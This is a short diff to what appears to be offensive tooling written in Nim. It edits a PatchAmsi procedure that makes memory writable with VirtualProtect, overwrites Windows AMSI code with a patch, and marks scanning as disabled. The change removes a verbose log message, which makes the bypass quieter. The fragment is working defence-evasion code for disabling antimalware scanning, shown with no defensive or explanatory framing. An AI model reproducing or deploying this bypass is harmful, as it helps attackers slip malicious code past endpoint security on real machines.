@@ -88,8 +88,6 @@ proc PatchAmsi(): bool =
         return disabled
 
     if VirtualProtect(cs, amsiPatch.len, 0x40, addr op):
-        if verbose:
-            echo "[*] Applying amsiPatch"
         copyMem(cs, unsafeAddr amsiPatch, amsiPatch.len)
         VirtualProtect(cs, amsiPatch.len, op, addr t)
         disabled = true
